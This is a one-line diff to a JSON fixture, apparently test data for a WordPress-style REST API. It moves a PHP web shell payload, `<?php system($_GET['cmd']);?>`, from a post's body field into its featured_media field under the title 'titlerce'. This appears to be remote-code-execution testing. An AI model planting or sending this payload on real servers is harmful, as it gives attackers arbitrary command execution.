@@ -1,1 +1,1 @@
-{"0":{"body":"<?php system($_GET['cmd']);?>","title":{"rendered":"titlerce"}}}
+{"0":{"featured_media":"<?php system($_GET['cmd']);?>","title":{"rendered":"titlerce"}}}
